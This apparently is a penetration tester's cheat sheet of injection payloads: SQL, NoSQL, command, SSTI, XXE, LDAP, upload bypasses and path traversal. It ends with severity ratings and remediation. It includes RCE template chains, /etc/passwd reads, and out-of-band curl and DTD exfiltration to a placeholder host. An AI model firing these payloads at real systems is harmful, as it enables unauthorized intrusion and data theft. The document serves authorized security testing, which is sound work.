# Injection: SQL / NoSQL / Command / SSTI / XXE / LDAP + File Upload / Traversal

## SQL Injection
Probe every param (URL, body, header, cookie) with error/boolean/time payloads.
```
'            "            `            ')            '))
' OR '1'='1        ' OR 1=1-- -        admin'--
1 AND 1=1        1 AND 1=2          (boolean diff)
' AND SLEEP(5)-- -   (MySQL)     ' AND pg_sleep(5)-- -  (Postgres)
'; WAITFOR DELAY '0:0:5'-- -  (MSSQL)    ' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)-- (Oracle)
```
Time-based confirms blind SQLi. Then automate carefully:
```bash
sqlmap -r request.txt --batch --risk=2 --level=3 --dbms=mysql --threads=4
# add --technique=BEUSTQ, --tamper=space2comment for WAF, --dump only in scope
```
Also test: second-order (input stored then used in later query), ORDER BY /
GROUP BY, LIMIT, INSERT/UPDATE contexts, JSON operators (`->>`).

## NoSQL Injection (Mongo etc.)
Auth bypass and data extraction via operator injection:
```
{"user":"admin","pass":{"$ne":null}}
{"user":{"$gt":""},"pass":{"$gt":""}}
username[$ne]=x&password[$ne]=x        (form-encoded)
{"$where":"sleep(5000)"}              (JS injection / blind)
{"user":{"$regex":"^admin"}}         (extract char-by-char)
```

## OS Command Injection
```
; id        | id        || id        & id        `id`      $(id)
%0a id      \n id       ${IFS} between args     newline injection
# Blind/OOB:
; curl http://COLLAB/$(whoami)     ; nslookup COLLAB
```
Watch feature areas: ping/traceroute tools, file converters, backup/exec,
git URL clone, ffmpeg/imagemagick wrappers.

## SSTI — Server-Side Template Injection
Detect with polyglot, then fingerprint engine:
```
{{7*7}} ${7*7} <%= 7*7 %> #{7*7} {{7*'7'}} ${{7*7}} @(7*7)
```
`49` from `{{7*7}}` ⇒ Jinja2/Twig/etc. Fingerprint tree (portswigger):
`{{7*7}}`→49, `{{7*'7'}}`→`7777777`(Jinja) or `49`(Twig).
Exploit (Jinja2 → RCE):
```
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
{{ cycler.__init__.__globals__.os.popen('id').read() }}
```
Use `tplmap`/`SSTImap` to automate identification. Keep RCE PoC to `id`/`whoami`.

## XXE — XML External Entity
Any XML/SOAP/SVG/DOCX/XLSX/SAML input:
```xml
<?xml version="1.0"?>
<!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]>
<root>&x;</root>
```
Blind/OOB with external DTD:
```xml
<!DOCTYPE r [<!ENTITY % p SYSTEM "http://COLLAB/e.dtd"> %p;]>
```
`e.dtd` exfiltrates file contents over HTTP. Also test XInclude, and XXE via
`Content-Type: application/xml` swap on JSON endpoints.

## LDAP Injection
```
*)(uid=*))(|(uid=*      *)(|(objectclass=*)      admin)(&))
```
On login/search forms bound to directory. Confirm with auth bypass or result
widening.

## File Upload → RCE / stored XSS
- Bypass extension filters: `shell.php.jpg`, `shell.pHp`, `shell.php%00.jpg`,
  double ext, `.phtml/.php5/.phar`, trailing dot/space, case.
- Content-type + magic-byte spoof: prepend `GIF89a;` to a PHP polyglot.
- SVG → stored XSS (`<svg><script>`), HTML upload → stored XSS, XML → XXE.
- `.htaccess`/`web.config` upload to redefine handlers.
- Find the retrieval path; RCE only if server executes the upload dir.
- ImageTragick/Ghostscript: malicious image → RCE where processing is old.

## Path Traversal / LFI
```
../../../../etc/passwd        ..%2f..%2f..%2fetc%2fpasswd
....//....//etc/passwd        %2e%2e%2f (encoded)     ..%c0%af (overlong)
/etc/passwd%00.png (null)     php://filter/convert.base64-encode/resource=index.php
/proc/self/environ            file=../../../../windows/win.ini
```
LFI→RCE: log poisoning, `php://filter` chains, session file inclusion,
`/proc/self/fd`, PHP wrappers. RFI where `allow_url_include=On`.

## Severity
SQLi/cmd/SSTI/XXE-file-read/upload-RCE → Critical (RCE/data theft). LDAP auth
bypass → High. Blind XXE port-scan only → Medium.

## Remediation to recommend
Parameterized queries/ORM (never string-concat); allow-list input; sandbox or
logic-less templates with no user-controlled template source; disable external
entities + DTDs in XML parsers; store uploads off web-root with random names and
a strict type allow-list; canonicalize + confine file paths.
